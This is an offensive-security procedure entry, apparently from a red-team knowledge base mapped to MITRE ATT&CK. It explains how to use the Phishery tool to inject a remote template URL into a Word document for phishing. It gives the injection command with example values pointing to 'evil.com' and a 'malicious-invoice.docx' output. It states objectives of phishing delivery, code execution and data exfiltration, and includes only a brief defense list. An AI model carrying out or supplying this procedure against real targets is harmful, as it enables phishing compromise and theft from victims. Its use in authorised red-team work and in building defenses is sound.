---
id: 5764924c-7ae4-4faf-804a-67faab58d051
name: Inject-Phishing-Template-into-Word-Document
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.930357+00:00'
updated_at: '2023-04-10T20:36:51.165107+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - '[[techniques/Phishing|T1566 - Phishing]]'
  - '[[techniques/Template Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - '[[tags/DOCX - Template Injection]]'
  - '[[tags/Office - Attacks]]'
  - '[[tags/Template Injections Tools]]'
commands:
  - '[[commands/phishery-inject-url-into-word-doc]]'
platforms:
  - Windows
tools:
  - '[[tools/Phishery]]'
validated: true
---

# Inject-Phishing-Template-into-Word-Document

## Summary

This procedure uses the Phishery tool to inject a malicious phishing template URL into an existing Word document (.docx), enabling attackers to deliver payloads via template injection when the victim opens the file. It supports spear-phishing campaigns by modifying documents to load external templates that can execute code or redirect to attacker-controlled servers.

## Description

Phishing Word Document Injection exploits the template processing mechanism in Microsoft Word, where documents can reference external templates (e.g., via HTTP URLs). By injecting a URL pointing to an attacker-controlled template containing malicious macros or scripts, the procedure allows initial access upon document opening. This is effective in bypassing basic email filters and antivirus if the template is hosted on a trusted-looking domain. The target environment is typically Windows systems with Microsoft Office, and success relies on social engineering to entice the victim to enable content or macros. Expected outcomes include payload execution, such as downloading malware or establishing persistence.

## Requirements

1. Phishery tool installed and accessible in the PATH.
2. An existing clean Word document (.docx) as the input file.
3. A hosting setup for the phishing template URL (e.g., attacker-controlled web server).
4. Microsoft Word installed on the system for testing (optional, but recommended for verification).

## Defense

- Educate users on phishing risks and disabling automatic template loading in Office settings (File > Options > Trust Center > External Content).
- Deploy email gateways with attachment sandboxing to detect and block suspicious .docx files.
- Enable macro security to high/block disabled mode and monitor for external template fetches via network logs.
- Use endpoint detection tools to flag unexpected HTTP requests from Office processes.

## Objectives

1. Modify a legitimate-looking Word document to reference a malicious external template.
2. Deliver the injected document via phishing email to gain initial access to the victim's machine.
3. Achieve code execution or data exfiltration upon template loading and victim interaction.

## Instructions

### Step 1: Prepare the Phishing Template URL

**Context**: Host a malicious template (e.g., .dotx file with embedded macros) on an attacker-controlled server. Ensure the URL is accessible and mimics a legitimate domain to evade filters.

This step involves setting up the server but does not require a specific command; use standard web hosting tools like Apache or Nginx.

### Step 2: Inject the Template URL into the Word Document

**Context**: Use Phishery to embed the phishing template URL into the target .docx file. This modifies the document's settings.xml to reference the external template, which loads when opened in Word.

**Command** ([[commands/phishery-inject-url-into-word-doc]]):
```bash
phishery -u $_PHISHING_URL -i $_INPUT_DOCX -o $_OUTPUT_DOCX
```

> This command opens the input .docx, sets the template to the specified URL, and saves the modified version. Replace placeholders with actual values: e.g., $_PHISHING_URL as 'https://evil.com/template.dotx', $_INPUT_DOCX as 'invoice.docx', $_OUTPUT_DOCX as 'malicious-invoice.docx'. Expected output includes confirmation messages indicating successful injection.

### Step 3: Verify the Injection

**Context**: Open the output document in Word (in a safe VM) to confirm the template loads from the URL. Check document properties or use a hex editor to verify the settings.xml contains the injected URL.

No specific command needed; manually inspect or use Office's 'Edit Links to Files' under File > Info.
